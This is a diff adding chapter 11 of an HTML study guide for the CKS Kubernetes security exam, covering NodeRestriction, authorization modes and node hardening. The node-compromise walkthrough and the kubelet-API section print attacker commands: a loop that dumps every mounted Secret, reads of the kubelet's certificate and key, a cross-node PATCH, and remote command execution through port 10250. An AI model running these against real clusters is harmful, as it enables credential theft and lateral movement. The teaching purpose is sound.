+                            <li>✅ Can read/write pods scheduled ON node-worker-2 — only</li>
+                            <li>✅ Cannot touch node-worker-1 or node-worker-3 at all</li>
+                            <li>✅ Blast radius contained to ONE node</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <h4>Enabling NodeRestriction — API Server Configuration</h4>
+                <div class="diagram-container">
+                    <div class="diagram-title">Add NodeRestriction to the admission plugin list and verify</div>
+<pre>
+  # Step 1: Edit the API server manifest
+  $ vi /etc/kubernetes/manifests/kube-apiserver.yaml
+
+  # Find --enable-admission-plugins and add NodeRestriction:
+  - --enable-admission-plugins=NodeRestriction,PodSecurity,AlwaysPullImages,...
+
+  # Step 2: Save → kubelet restarts API server (10-30 seconds)
+
+  # Step 3: Verify NodeRestriction is active
+  $ kubectl get pods -n kube-system kube-apiserver-* -o yaml | grep NodeRestriction
+  → --enable-admission-plugins=NodeRestriction,...  ✅
+
+  # Step 4: Test — a kubelet CANNOT modify another node's labels
+  $ kubectl label node node-worker-1 test=value
+  → (From the compromised kubelet on node-worker-2)
+  → Error: node "node-worker-1" cannot be modified (NodeRestriction)
+</pre>
+                </div>
+
+                <h4>How NodeRestriction Actually Works — The Internal Mechanism</h4>
+                <p>NodeRestriction is not magic — it is a specific set of validation rules hardcoded into the API server's admission chain. Understanding exactly what it checks helps you diagnose when it blocks legitimate kubelet operations (rare, but possible during cluster upgrades or node replacements):</p>
+                <div class="diagram-container">
+                    <div class="diagram-title">NodeRestriction Validation Rules — What Gets Checked</div>
+<pre>
+  RULE 1: kubelet identity is derived from the username "system:node:&lt;nodeName&gt;"
+  ────────────────────────────────────────────────────────────────────────────────
+  If a request comes from user "system:node:worker-2", NodeRestriction
+  enforces that the kubelet can ONLY modify:
+  • Node object: "worker-2" (its OWN node — not worker-1, not worker-3)
+  • Pod objects: only pods where spec.nodeName == "worker-2"
+  • Any attempt to modify worker-1 → REJECTED with "node 'worker-1' is not
+    managed by node 'worker-2'"
+
+  RULE 2: kubelet cannot modify taints on its own node with
+          NoSchedule or NoExecute effects
+  ───────────────────────────────────────────────────────────
+  A compromised kubelet CANNOT taint its own node to attract or repel
+  specific workloads. Only the API server (via scheduler) or cluster-admin
+  can modify taints. This prevents a compromised kubelet from making its
+  node a "preferred" target for sensitive pods.
+
+  RULE 3: kubelet cannot set labels prefixed with
+          "node-restriction.kubernetes.io/" on its own node
+  ───────────────────────────────────────────────────────────
+  This label prefix is RESERVED. Only the NodeRestriction admission
+  plugin itself can set these labels. Kubelets cannot modify them.
+
+  RULE 4: kubelet can only update its own node's status sub-resources
+  ────────────────────────────────────────────────────────────────────
+  Node status updates (Ready, MemoryPressure, DiskPressure) are
+  restricted to the kubelet's own node. A kubelet on worker-2 cannot
+  mark worker-3 as NotReady.
+</pre>
+                </div>
+
+                <h4>What Happens When You Try to Bypass NodeRestriction</h4>
+                <p>The CKS exam may present a scenario where NodeRestriction is disabled and ask you to enable it — or present a scenario where it IS enabled and ask you to diagnose why a kubelet operation is failing. Here is exactly what the API server returns when NodeRestriction blocks a request:</p>
+                <div class="diagram-container">
+                    <div class="diagram-title">NodeRestriction Blocks — Error Messages and What They Mean</div>
+<pre>
+  ATTEMPT 1: Kubelet on worker-2 tries to label worker-1
+  ─────────────────────────────────────────────────────
+  $ kubectl --as=system:node:worker-2 label node worker-1 test=value
+  Error: nodes "worker-1" is forbidden: node "worker-2" is not allowed
+  to modify node "worker-1"
+  → FIX: Legitimate. The kubelet should NOT touch other nodes.
+
+  ATTEMPT 2: Kubelet on worker-2 tries to evict a pod on worker-3
+  ────────────────────────────────────────────────────────────────
+  $ kubectl --as=system:node:worker-2 delete pod anihpj-pod --grace-period=0
+  Error: pods "anihpj-pod" is forbidden: node "worker-2" is not allowed
+  to modify pods not assigned to it
+  → FIX: The pod is on worker-3, not worker-2. This is NodeRestriction working correctly.
+
+  ATTEMPT 3: Kubelet tries to set taint with NoSchedule
+  ─────────────────────────────────────────────────────
+  $ kubectl --as=system:node:worker-2 taint node worker-2 dedicated=user:NoSchedule
+  Error: node "worker-2" is forbidden: node "worker-2" is not allowed to
+  modify taint "dedicated"
+  → FIX: Only cluster-admin can modify taints. The kubelet cannot.
+</pre>
+                </div>
+            </div>
+
+            <div class="section-block" id="s11-2">
+                <h3>11.2 Authorization Modes — Understanding the Chain</h3>
+                <p>Kubernetes supports <strong>multiple authorization modes simultaneously</strong>, checked in order. When a request arrives, each mode is evaluated. The <strong>first mode that explicitly ALLOWS</strong> the request stops the chain — the request proceeds. If no mode ALLOWS, the request is DENIED. This means the order matters, and a poorly placed <code>AlwaysAllow</code> mode would grant every request before RBAC ever gets checked.</p>
+
+                <h4>Authorization Mode Comparison</h4>
+                <div class="comparison-table">
+                    <table>
+                        <thead><tr><th>Mode</th><th>How It Works</th><th>Security Level</th><th>When to Use</th></tr></thead>
+                        <tbody>
+                            <tr><td><strong>AlwaysAllow</strong></td><td>Allow every request, no checks</td><td style="color:#ef4444;">🔴 NEVER IN PRODUCTION</td><td>Testing only — REMOVE before going live</td></tr>
+                            <tr><td><strong>AlwaysDeny</strong></td><td>Deny every request</td><td style="color:#eab308;">⚠️ Testing only</td><td>Testing admission plugins — blocks everything</td></tr>
+                            <tr><td><strong>RBAC</strong></td><td>Roles + RoleBindings define permissions</td><td style="color:#4ade80;">✅ Standard</td><td>All production clusters — the primary mode</td></tr>
+                            <tr><td><strong>Node</strong></td><td>Restricts kubelet API access by node</td><td style="color:#4ade80;">✅ Required</td><td>All production clusters — paired with RBAC</td></tr>
+                            <tr><td><strong>Webhook</strong></td><td>External service decides allow/deny via HTTP</td><td style="color:#4ade80;">✅ Advanced</td><td>Custom authorization logic, OPA integration</td></tr>
+                            <tr><td><strong>ABAC</strong></td><td>Attribute-based, policy file on disk</td><td style="color:#ef4444;">⚠️ Legacy — avoid</td><td>Legacy clusters — migrate to RBAC</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h4>Secure Authorization Configuration</h4>
+                <div class="diagram-container">
+                    <div class="diagram-title">The only authorization mode combination you should use</div>
+<pre>
+  # API server flag — secure configuration:
+  --authorization-mode=Node,RBAC
+
+  # What this does (checked in order):
+  # 1. Node authorizer: kubelet requests checked first
+  #    → Is this kubelet authorized to access this node/pod?
+  #    → If ALLOW: request proceeds. If DENY: passes to RBAC.
+  # 2. RBAC: all other requests checked against Roles/Bindings
+  #    → Does this user/SA have a binding allowing this action?
+  #    → If ALLOW: request proceeds. If no rule: DENIED.
+
+  # ❌ NEVER DO THIS:
+  --authorization-mode=AlwaysAllow,RBAC
+  # → AlwaysAllow matches FIRST → ALL requests allowed → RBAC NEVER checked.
+  # → This is equivalent to having NO authorization at all.
+
+  # ✅ THE ORDER MATTERS:
+  --authorization-mode=Node,RBAC
+  # → Node checked first (kubelet-specific rules), then RBAC (everything else).
+  # → If Node and RBAC both DENY, the request is denied.
+</pre>
+                </div>
+
+                <div class="scenario-box">
+                    <h5>😰 Real-World Scenario: When AlwaysAllow Was Left Enabled</h5>
+                    <p>A cluster was deployed with <code>--authorization-mode=AlwaysAllow,RBAC</code> during development for convenience. The cluster went to production without removing AlwaysAllow. Every API request — from every user, every ServiceAccount, even anonymous requests — was allowed. RBAC rules existed but were never consulted. The cluster ran for six months with effectively zero authorization. An attacker who gained a single pod's ServiceAccount token had full cluster-admin access — because AlwaysAllow granted it before RBAC could say no. <strong>Lesson: Always audit your authorization mode. One typo disables all authorization.</strong></p>
+                </div>
+
+                <h4>Authorization Mode Decision Tree</h4>
+                <div class="decision-tree">
+                    <div class="decision-node question">⚙️ What does your --authorization-mode flag contain?</div>
+                    <div class="decision-branches">
+                        <div><div class="decision-node yes">AlwaysAllow present → 🔴 REMOVE IMMEDIATELY. This disables all authorization.</div></div>
+                        <div><div class="decision-node no">No AlwaysAllow. Continue.</div></div>
+                    </div>
+                    <div class="decision-node question">📋 Does it include Node AND RBAC?</div>
+                    <div class="decision-branches">
+                        <div><div class="decision-node no">❌ Missing Node → Add it. Kubelets need Node authorization. Missing RBAC → Add it. This is your primary authorization.</div></div>
+                        <div><div class="decision-node yes">✅ Node,RBAC present → This is the CKS-recommended configuration.</div></div>
+                    </div>
+                    <div class="decision-node question">🔍 Is ABAC or static token file present?</div>
+                    <div class="decision-branches">
+                        <div><div class="decision-node yes">⚠️ ABAC/static tokens → Legacy. Plan migration to RBAC. Remove ABAC policy file and --token-auth-file flag.</div></div>
+                        <div><div class="decision-node no">✅ Clean — only modern authorization modes. CKS target state.</div></div>
+                    </div>
+                </div>
+
+                <h4>How the Node Authorizer Works — Internal Rules</h4>
+                <p>The Node authorization mode is a special-purpose authorizer designed exclusively for kubelets. Unlike RBAC (which matches arbitrary rules to arbitrary subjects), the Node authorizer has a fixed set of rules based on the kubelet's identity. Understanding these rules helps you diagnose when the Node authorizer ALLOWS a request (and RBAC is never checked) vs when it passes the request to RBAC:</p>
+                <div class="diagram-container">
+                    <div class="diagram-title">Node Authorizer — Built-in Permission Rules</div>
+<pre>
+  IDENTITY: A kubelet authenticates as "system:node:&lt;nodeName&gt;"
+  GROUP: The kubelet is in the group "system:nodes"
+
+  NODE AUTHORIZER ALLOWS (without consulting RBAC):
+  ──────────────────────────────────────────────────
+  • Read services, endpoints, nodes (to discover cluster topology)
+  • Read/write pods bound to its OWN node
+  • Read/write node status for its OWN node
+  • Read/write events for its OWN node's pods
+  • Read ConfigMaps, Secrets referenced by pods on its node
+  • Read PVs, PVCs referenced by pods on its node
+  • CertificateSigningRequest: create/update for its own node cert
+
+  NODE AUTHORIZER PASSES TO RBAC (no opinion):
+  ─────────────────────────────────────────────
+  • Any request NOT listed above → passed to the next authorizer (RBAC)
+  • This means: if a kubelet tries to read ALL Secrets in a namespace,
+    Node passes → RBAC checks → DENIED (unless RBAC explicitly allows)
+
+  🔑 KEY INSIGHT: The Node authorizer is DEFENSE-IN-DEPTH for kubelets.
+     It GRANTS the minimum permissions kubelets need to function, AND
+     it RESTRICTS them from requesting anything beyond that.
+     Even if RBAC somehow granted a kubelet cluster-admin (a catastrophic
+     misconfiguration), the Node authorizer would still DENY requests
+     to modify other nodes — because Node authorizer operates BEFORE RBAC.
+</pre>
+                </div>
+            </div>
+
+            <div class="section-block" id="s11-3">
+                <h3>11.3 Protecting Node-Level Access</h3>
+                <p>Node-level access — SSH, console, and kubelet API — represents the deepest level of compromise. If an attacker gains SSH access to a node, they can read all Secrets mounted on that node, access the container runtime directly, modify static pod manifests, and potentially compromise the entire control plane if they land on a control plane node. Node-level hardening is the last line of defense in the CKS model.</p>
+
+                <h4>Node Access Hardening Checklist</h4>
+                <div class="diagram-container">
+                    <div class="diagram-title">SSH and Node-Level Security — Every Control</div>
+<pre>
+  □ SSH: Disable root login
+      $ grep PermitRootLogin /etc/ssh/sshd_config
+      → PermitRootLogin no
+
+  □ SSH: Key authentication only — no passwords
+      $ grep PasswordAuthentication /etc/ssh/sshd_config
+      → PasswordAuthentication no
+
+  □ SSH: Restrict to specific users/groups
+      $ grep AllowUsers /etc/ssh/sshd_config
+      → AllowUsers admin@10.0.0.0/8
+
+  □ SSH: Audit all login attempts
+      $ grep sshd /var/log/auth.log | grep Accepted
+      → Review regularly for unauthorized access
+
+  □ Kubelet API (10250): Anonymous auth disabled
+      $ grep anonymous /var/lib/kubelet/config.yaml
+      → enabled: false
+
+  □ Kubelet API (10250): Webhook authorization
+      $ grep authorization /var/lib/kubelet/config.yaml
+      → mode: Webhook
+
+  □ Kubelet read-only port (10255): DISABLED
+      $ grep readOnlyPort /var/lib/kubelet/config.yaml
+      → readOnlyPort: 0
+
+  □ IAM roles (cloud): Minimal permissions for node instances
+      AWS: Node IAM role should NOT have s3:* or iam:* permissions
+      → Only ec2:DescribeInstances, ecr:GetAuthorizationToken, etc.
+
+  □ Remove stale user accounts from all nodes
+      $ awk -F: '$3 >= 1000 {print $1}' /etc/passwd
+      → Audit: every human account must be justified.
+</pre>
+                </div>
+
+                <h4>Kubelet API Protection — The Last Network Barrier</h4>
+                <div class="diagram-container">
+                    <div class="diagram-title">How an attacker exploits an exposed kubelet API (port 10250)</div>
+<pre>
+  ATTACKER gains network access to node IP on port 10250
+  ───────────────────────────────────────────────────────
+
+  WITHOUT kubelet hardening:
+  $ curl -k https://node-worker-2:10250/pods
+  → Returns ALL pods running on this node — full pod specs, labels, env vars
+  $ curl -k https://node-worker-2:10250/stats/summary
+  → Returns CPU, memory, network stats for every container
+  $ curl -k https://node-worker-2:10250/run/.../anihpj-pod/anihpj?cmd=whoami
+  → Executes "whoami" inside the anihpj container → returns "root"
+
+  WITH kubelet hardening (anonymous=false + webhook auth):
+  $ curl -k https://node-worker-2:10250/pods
+  → 401 Unauthorized — kubelet requires authentication
+  $ curl -k -H "Authorization: Bearer &lt;stolen-SA-token&gt;" .../pods
+  → 403 Forbidden — SA token not authorized for kubelet API (RBAC denies)
+  $ curl -k -H "Authorization: Bearer &lt;valid-admin-token&gt;" .../pods
+  → 200 OK + pod list — only authorized users can access kubelet API
+
+  🔑 KEY INSIGHT: With webhook authorization, the kubelet sends EVERY request
+     to the API server for a SubjectAccessReview. No local decision-making.
+     The API server's RBAC controls who can access every kubelet.
+</pre>
+                </div>
+
+                <h4>Cloud IAM Role Minimization — Node Instances Should Have Zero Power</h4>
+                <p>When Kubernetes nodes run on cloud providers, each node inherits the IAM role attached to its VM instance. A common security mistake is attaching broad IAM roles (like <code>AdministratorAccess</code>) to nodes "to make things easier." This means any pod on that node can access those cloud permissions via the instance metadata service. Here is what proper node IAM minimization looks like:</p>
+                <div class="comparison-table">
+                    <table>
+                        <thead><tr><th>Cloud Provider</th><th>Minimum Required Permissions</th><th>NEVER Include</th></tr></thead>
+                        <tbody>
+                            <tr><td><strong>AWS</strong></td><td><code>ec2:DescribeInstances</code>, <code>ecr:GetAuthorizationToken</code>, <code>ecr:BatchGetImage</code></td><td style="color:#ef4444;"><code>s3:*</code>, <code>iam:*</code>, <code>sts:*</code></td></tr>
+                            <tr><td><strong>Azure</strong></td><td><code>Microsoft.Compute/virtualMachines/read</code>, ACR pull permissions</td><td style="color:#ef4444;"><code>Contributor</code> role, Storage Account keys</td></tr>
+                            <tr><td><strong>GCP</strong></td><td><code>compute.instances.get</code>, <code>artifactregistry.reader</code></td><td style="color:#ef4444;"><code>Editor</code> role, Service Account Token Creator</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+                <p style="color:#f87171;font-weight:700;">🔴 CKS Rule: If a node IAM role includes <code>s3:*</code>, an attacker who compromises ANY pod on that node can read ALL S3 buckets in the account. This is exactly how Capital One was breached.</p>
+
+                <h4>Node Compromise Attack Walkthrough — What Happens Step by Step</h4>
+                <div class="diagram-container">
+                    <div class="diagram-title">Scenario: Attacker escapes container → gains node access → what now?</div>
+<pre>
+  ATTACKER has root on node-worker-2 (via container escape). Now what?
+  ───────────────────────────────────────────────────────────────────
+
+  STEP 1: Read all Secrets on this node
+  $ for secret in $(ls /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/); do
+      cat /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/$secret/* 2>/dev/null
+    done
+  → ALL Secrets from ALL pods on this node — DB passwords, API keys, TLS certs.
+
+  STEP 2: Access kubelet credentials
+  $ cat /var/lib/kubelet/pki/kubelet-client-current.pem
+  → kubelet's client certificate — can authenticate to API server as "system:node:worker-2"
+
+  STEP 3: Try to modify other nodes (WITHOUT NodeRestriction)
+  $ curl -k https://kube-apiserver:6443/api/v1/nodes/worker-1 \
+      --cert /var/lib/kubelet/pki/kubelet-client-current.pem \
+      --key /var/lib/kubelet/pki/kubelet-client-key.pem \
+      -X PATCH -H "Content-Type: application/merge-patch+json" \
+      -d '{"metadata":{"labels":{"compromised":"true"}}}'
+  → SUCCESS (without NodeRestriction) — attacker now controls worker-1 labels!
+
+  STEP 4: WITH NodeRestriction enabled
+  → Same request returns: "node worker-1 is not allowed to modify by node worker-2"
+  → BLOCKED. Attacker trapped on worker-2.
+
+  BLAST RADIUS COMPARISON:
+  Without NodeRestriction: worker-2 compromise → ALL nodes compromised
+  With NodeRestriction:    worker-2 compromise → ONLY worker-2 compromised
+</pre>
+                </div>
+
+                <h4>Node Hardening Impact — Before vs After</h4>
+                <div class="stat-bar-group">
+                    <div class="stat-bar-item">
+                        <span class="stat-bar-label">🔴 Default Node (no hardening) — Security Score</span>
+                        <span class="stat-bar-value">8% — anonymous kubelet, no NodeRestriction, root SSH</span>
+                        <div class="stat-bar"><div class="stat-bar-fill red" style="width: 8%"></div></div>
+                    </div>
+                    <div class="stat-bar-item">
+                        <span class="stat-bar-label">🟡 With kubelet Auth + NodeRestriction</span>
+                        <span class="stat-bar-value">55% — kubelet locked down, nodes isolated</span>
+                        <div class="stat-bar"><div class="stat-bar-fill red" style="width: 55%"></div></div>
+                    </div>
+                    <div class="stat-bar-item">
+                        <span class="stat-bar-label">🟢 Fully Hardened (kubelet + SSH + IAM + AuthZ = Node,RBAC)</span>
+                        <span class="stat-bar-value">92% — multi-layer node defense, CKS target state</span>
+                        <div class="stat-bar"><div class="stat-bar-fill red" style="width: 92%"></div></div>
+                    </div>
+                </div>
+
+                <div class="visual-summary">
+                    <h4>📊 Chapter 11 Visual Summary</h4>
+                    <div class="vs-grid">
+                        <div class="vs-item">
+                            <span class="vs-icon">🔒</span>
+                            <span class="vs-label">NodeRestriction</span>
+                            <span class="vs-detail">Limits kubelets to their own node + pods. One compromised kubelet = one node at risk, not the cluster.</span>
+                        </div>
+                        <div class="vs-item">
+                            <span class="vs-icon">⚙️</span>
+                            <span class="vs-label">AuthZ Modes</span>
+                            <span class="vs-detail">Node,RBAC is the only safe combination. AlwaysAllow disables ALL authorization.</span>
+                        </div>
+                        <div class="vs-item">
+                            <span class="vs-icon">🔑</span>
+                            <span class="vs-label">SSH Hardening</span>
+                            <span class="vs-detail">No root login. Key-only auth. Restricted users. Audit all access. Remove stale accounts.</span>
+                        </div>
+                        <div class="vs-item">
+                            <span class="vs-icon">🚪</span>
+                            <span class="vs-label">Kubelet API</span>
+                            <span class="vs-detail">Anonymous=false, webhook auth, readOnlyPort=0. Every request → SubjectAccessReview.</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="info-box tip">
+                    <h5>💡 Key Takeaway for the CKS Exam</h5>
+                    <p>The CKS exam expects you to configure THREE things for node security: (1) <strong>NodeRestriction admission plugin</strong> on the API server, (2) <strong>--authorization-mode=Node,RBAC</strong> on the API server, and (3) <strong>kubelet hardening</strong> (anonymous=false, webhook auth, readOnlyPort=0). These three controls work together — missing any one leaves a gap. Always verify all three: <code>kubectl describe pod -n kube-system kube-apiserver-* | grep -E 'NodeRestriction|authorization-mode'</code> AND <code>grep -E 'anonymous|webhook|readOnlyPort' /var/lib/kubelet/config.yaml</code>.</p>
+                </div>
+            </div>
+        </div><div id="ch12"><div class="content-placeholder"><div class="placeholder-icon">⬆️</div><p>Chapter 12: Version Management — Content coming soon</p></div></div></section>
     <section class="chapter-section" id="part4"><h2><span>🟡 Part 4: System Hardening</span><span class="chapter-badge">Chapters 13-16 · CKS 10%</span></h2><div id="ch13"><div class="content-placeholder"><div class="placeholder-icon">🖥️</div><p>Chapter 13: Reducing the OS Attack Surface — Content coming soon</p></div></div><div id="ch14"><div class="content-placeholder"><div class="placeholder-icon">🛡️</div><p>Chapter 14: AppArmor — Content coming soon</p></div></div><div id="ch15"><div class="content-placeholder"><div class="placeholder-icon">🔍</div><p>Chapter 15: Seccomp — Content coming soon</p></div></div><div id="ch16"><div class="content-placeholder"><div class="placeholder-icon">📡</div><p>Chapter 16: Ports, Packages & IAM Minimization — Content coming soon</p></div></div></section>
     <section class="chapter-section" id="part5"><h2><span>🟡 Part 5: Minimize Microservice Vulnerabilities</span><span class="chapter-badge">Chapters 17-22 · CKS 20%</span></h2><div id="ch17"><div class="content-placeholder"><div class="placeholder-icon">📋</div><p>Chapter 17: Pod Security Standards (PSS) — Content coming soon</p></div></div><div id="ch18"><div class="content-placeholder"><div class="placeholder-icon">⚙️</div><p>Chapter 18: Security Contexts — Content coming soon</p></div></div><div id="ch19"><div class="content-placeholder"><div class="placeholder-icon">🔐</div><p>Chapter 19: Secrets — Encryption at Rest — Content coming soon</p></div></div><div id="ch20"><div class="content-placeholder"><div class="placeholder-icon">🏦</div><p>Chapter 20: External Secrets (Vault) — Content coming soon</p></div></div><div id="ch21"><div class="content-placeholder"><div class="placeholder-icon">📦</div><p>Chapter 21: Container Runtime Sandboxing — Content coming soon</p></div></div><div id="ch22"><div class="content-placeholder"><div class="placeholder-icon">🔗</div><p>Chapter 22: mTLS & Service Mesh Security — Content coming soon</p></div></div></section>
     <section class="chapter-section" id="part6"><h2><span>🔴 Part 6: Supply Chain Security</span><span class="chapter-badge">Chapters 23-27 · CKS 20%</span></h2><div id="ch23"><div class="content-placeholder"><div class="placeholder-icon">🔍</div><p>Chapter 23: Image Security & Scanning — Content coming soon</p></div></div><div id="ch24"><div class="content-placeholder"><div class="placeholder-icon">🚪</div><p>Chapter 24: Admission Controllers — Content coming soon</p></div></div><div id="ch25"><div class="content-placeholder"><div class="placeholder-icon">📊</div><p>Chapter 25: Static Analysis (Kubesec/KubeLinter) — Content coming soon</p></div></div><div id="ch26"><div class="content-placeholder"><div class="placeholder-icon">✍️</div><p>Chapter 26: Image Signing — cosign — Content coming soon</p></div></div><div id="ch27"><div class="content-placeholder"><div class="placeholder-icon">📋</div><p>Chapter 27: SBOM & SLSA — Content coming soon</p></div></div></section>
